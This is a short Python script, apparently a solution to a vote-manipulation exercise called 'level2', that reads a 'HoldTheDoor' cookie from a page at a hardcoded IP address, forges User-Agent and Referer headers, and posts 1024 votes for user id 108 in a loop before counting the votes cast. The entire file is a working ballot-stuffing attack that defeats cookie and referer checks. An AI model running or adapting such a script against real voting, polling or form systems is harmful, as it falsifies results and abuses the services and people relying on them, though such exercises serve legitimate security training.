#!/usr/bin/python3
import requests
from  functions import fetch_vote_count

URL = "http://54.221.6.249/level2.php"
r = requests.get(URL)
key = r.cookies["HoldTheDoor"]
userid = "108"
start_votes = fetch_vote_count(userid, URL)
header = {
    "Host": "54.221.6.249",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/53.0",
    "Referer": "http://54.221.6.249/level2.php",
}
payload = {
    "id": userid,
    "holdthedoor": "Submit",
    "key": key
}
for i in range(1024):
    r = requests.post(URL, data=payload, cookies={"HoldTheDoor": key}, headers=header)
    print(i+1)
end_votes = fetch_vote_count(userid, URL)
votes_cast = int(end_votes) - int(start_votes)
print("Votes cast: {:d}".format(votes_cast))
